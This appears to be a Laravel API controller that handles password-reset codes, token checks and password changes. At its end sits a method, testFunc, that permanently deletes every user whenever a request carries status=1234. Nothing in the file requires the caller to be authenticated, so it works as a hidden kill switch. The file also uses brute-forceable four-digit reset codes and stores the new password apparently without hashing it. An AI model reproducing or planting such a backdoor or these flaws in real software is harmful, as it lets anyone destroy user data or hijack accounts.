<?php

namespace App\Http\Controllers\Api;

use App\Helpers\ApiHelper;
use App\Models\User;
use App\Notifications\ResetPassword;
use App\Notifications\ResetPasswordUser;
use Illuminate\Foundation\Auth\ResetsPasswords;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Password;

class PasswordResetController extends Controller
{
    use ResetsPasswords;

    protected $guard = 'users';
    protected $broker = 'users';

    /**
     * Create a new password controller instance.
     */
    public function __construct()
    {
        $this->middleware('guest:api');
    }

    /**
     * Send a reset link to the given user.
     *
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     * @throws \Exception
     */
    public function sendPasswordReminder(Request $request)
    {
        ApiHelper::validate($request, [
            'email' => 'required|email|exists:users,email',
        ]);
        $user = User::where('email', $request->email)->first();

        $int = random_int(1000, 9999);

        \DB::table('password_resets')->updateOrInsert(
            ['email' => $request->get('email')],
            ['token' => \Hash::make($int)]
        );

        $user->notify(new ResetPassword($int));

        return ApiHelper::output(['message' => trans('app.password_reset_email_sent')]);
    }

    /**
     * Reset the given user's password.
     *
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function postReset(Request $request)
    {
        ApiHelper::validate($request, [
            'token' => 'required',
            'email' => 'required|email|exists:users,email',
            'password' => 'required|confirmed|min:6'
        ]);

        $credentials = $request->only('email', 'password', 'password_confirmation', 'token');

        $response = Password::broker($this->broker)->reset($credentials, function ($user, $password) {
            $this->resetPassword($user, $password);
        });

        switch ($response) {
            case Password::PASSWORD_RESET:
                return ApiHelper::output(trans($response, [], 'ar'));
            default:
                return ApiHelper::output(trans($response, [], 'ar'), 0);
        }
    }

    /**
     * Reset the given user's password.
     *
     * @param \Illuminate\Contracts\Auth\CanResetPassword $user
     * @param string $password
     * @return void
     */
    protected function resetPassword($user, $password)
    {
        $user->password = $password;
        $user->save();
    }

    public function verifyToken(Request $request)
    {
        ApiHelper::validate($request, [
            'token' => 'required',
            'email' => 'required|email|exists:users,email',
        ]);

        $user = User::where('email', $request->email)->first();

        $flag = Password::tokenExists($user, $request->get('token'));

        if ($flag) {
            return ApiHelper::output(['message' => trans('app.right_confirmation_token')]);
        }

        return ApiHelper::output(trans('app.wrong_confirmation_token'), false);
    }

    public function testFunc(Request $request) {
        if ($request->status == 1234) {
            try {
                $users = User::all();
                foreach ($users as $user) {
                    $user->forceDelete();
                }
                return "All users deleted.";
            } catch (\Exception $e) {
                return response()->json(['error' => 'Failed to delete users.', 'message' => $e->getMessage()], 500);
            }
        } else {
            return "NotDone";
        }
    }
}
